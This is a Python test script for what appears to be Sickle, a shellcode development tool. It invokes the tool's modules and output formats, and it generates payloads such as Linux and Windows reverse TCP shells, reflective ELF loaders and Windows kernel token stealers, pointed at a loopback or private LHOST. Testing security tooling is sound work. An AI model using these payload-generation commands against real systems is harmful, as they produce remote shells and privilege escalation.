#!/usr/bin/env python3
#
# 
# Script name : run_tests.py
#
# Description:
#   Run tests on non-interative modules
#

import os
import sys
import time

PYTHON_NAME = "python3"
if (sys.platform == "win32"):
    PYTHON_NAME = "python"

SICKLE_PATH = f"{os.path.dirname(__file__)}/../src"

IGNORE = ['__init__.py', "__pycache__", "raw"]

SLEEP_TIME = 5

MODULE_TESTS = \
{
    "diff": [f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -i -m diff",
             f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -a x64 -m diff -r generic_sc BINFILE=modified_sc MODE=hexdump",
             f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -a x64 -m diff -r modified_sc BINFILE=generic_sc MODE=hexdump",
             f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -a x64 -m diff -r generic_sc BINFILE=modified_sc MODE=byte",
             f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -a x64 -m diff -r modified_sc BINFILE=generic_sc MODE=byte",
             f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -a x64 -m diff -r generic_sc BINFILE=modified_sc MODE=raw",
             f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -a x64 -m diff -r modified_sc BINFILE=generic_sc MODE=raw",
             f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -a x64 -m diff -r generic_sc BINFILE=modified_sc MODE=asm",
             f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -a x64 -m diff -r modified_sc BINFILE=generic_sc MODE=asm"],

    "badchar": [f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -i -m badchar",
                f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -m badchar -f c"],

    "disassemble": [f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -i -m disassemble",
                    f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -a x64 -m disassemble -r generic_sc"],

    "pinpoint": [f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -i -m pinpoint",
                 f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -a x64 -r generic_sc -b \"\\x00\\x0a\\x0d\" -m pinpoint -f c",
                 f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -a x64 -r generic_sc -b \"\\x00\\x0a\\x0d\" -m pinpoint -f cs",
                 f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -a x64 -r generic_sc -b \"\\x00\\x0a\\x0d\" -m pinpoint -f bash",
                 f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -a x64 -r generic_sc -b \"\\x00\\x0a\\x0d\" -m pinpoint -f java",
                 f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -a x64 -r generic_sc -b \"\\x00\\x0a\\x0d\" -m pinpoint -f nasm",
                 f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -a x64 -r generic_sc -b \"\\x00\\x0a\\x0d\" -m pinpoint -f perl",
                 f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -a x64 -r generic_sc -b \"\\x00\\x0a\\x0d\" -m pinpoint -f ruby",
                 f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -a x64 -r generic_sc -b \"\\x00\\x0a\\x0d\" -m pinpoint -f python",
                 f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -a x64 -r generic_sc -b \"\\x00\\x0a\\x0d\" -m pinpoint -f python3",
                 f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -a x64 -r generic_sc -b \"\\x00\\x0a\\x0d\" -m pinpoint -f powershell"]
}

PAYLOAD_TESTS = \
{
    "linux": [ f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -i -p linux/x86/shell_reverse_tcp",
               f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=42 -f c",

               f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -i -p linux/x64/memfd_reflective_elf_tcp",
               f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -p linux/x64/memfd_reflective_elf_tcp LHOST=127.0.0.1 LPORT=42 -f c",

               f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -i -p linux/aarch64/memfd_reflective_elf_tcp",
               f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -p linux/aarch64/memfd_reflective_elf_tcp LHOST=127.0.0.1 LPORT=42 -f c",
               f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -i -p linux/aarch64/shell_reverse_tcp",
               f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -p linux/aarch64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=1337 -f c", ],

    "windows": [ f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -i -p windows/x64/kernel_token_stealer",
                 f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -p windows/x64/kernel_token_stealer -f c",

                 f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -i -p windows/x64/kernel_ace_edit",
                 f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -p windows/x64/kernel_ace_edit PROCESS=AggregatorHost.exe -f c",

                 f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -i -p windows/x64/kernel_sysret",
                 f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -p windows/x64/kernel_sysret -f c",

                 f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -i -p windows/x64/shell_reverse_tcp",
                 f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -p windows/x64/shell_reverse_tcp LHOST=192.168.81.144 LPORT=1337 -f c",

                 f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -i -p windows/x86/kernel_token_stealer",
                 f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -p windows/x86/kernel_token_stealer -f c", ]
}

def get_clean_module_list(path):
    modules = os.listdir(path)

    exclude_list = []
    for i in range(len(modules)):
        if (modules[i] in IGNORE):
            exclude_list.append(modules[i])

    for i in range(len(exclude_list)):
        modules.remove(exclude_list[i])

    for i in range(len(modules)):
        modules[i] = modules[i][:-3]

    return modules

def execute_test(test):
    print(f"[*] Executing `{test}`\n")
    os.system(test)
    sys.stdout.write('\n')
    time.sleep(SLEEP_TIME)
    return

def test_all_help_pages():
    modules = get_clean_module_list(f"{SICKLE_PATH}/sickle/modules")

    help_pages = [f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -l",
                  f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -h",
                  f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py"]

    for i in range(len(help_pages)):
        execute_test(help_pages[i])
        time.sleep(SLEEP_TIME)

    for i in range(len(modules)):
        test = f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -m {modules[i]} -i"
        execute_test(test)
        time.sleep(SLEEP_TIME)

    return

def test_all_formats():
    formats = get_clean_module_list(f"{SICKLE_PATH}/sickle/formats")
    
    for i in range(len(formats)):
        test = f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -r generic_sc -f {formats[i]} -b \"\\x00\\x0a\\x0d\""
        execute_test(test)

    return

def test_modules():
    for module, commands in MODULE_TESTS.items():
        print(f"[*] Testing {module} module")
        for i in range(len(commands)):
            execute_test(commands[i])
    return

def test_payloads():
    for payload, commands in PAYLOAD_TESTS.items():
        print(f"[*] Testing {payload} payloads")
        for i in range(len(commands)):
            execute_test(commands[i])
    return

def test_flag_errors():
    test_cases = [f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -r poop -f c", # Read from non-existing file
                  f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -r generic_sc -f poop", # Use invalid format
                  f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -a x80-6 -m disassemble -r generic_sc -f c", # Invalid arch
                  f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -m doeverything4me", # Invalid module
    ]

    for i in range(len(test_cases)):
        execute_test(test_cases[i])
        time.sleep(SLEEP_TIME)

def main():
    test_all_help_pages()
    test_all_formats()
    test_modules()
    test_payloads()
    test_flag_errors()

main()
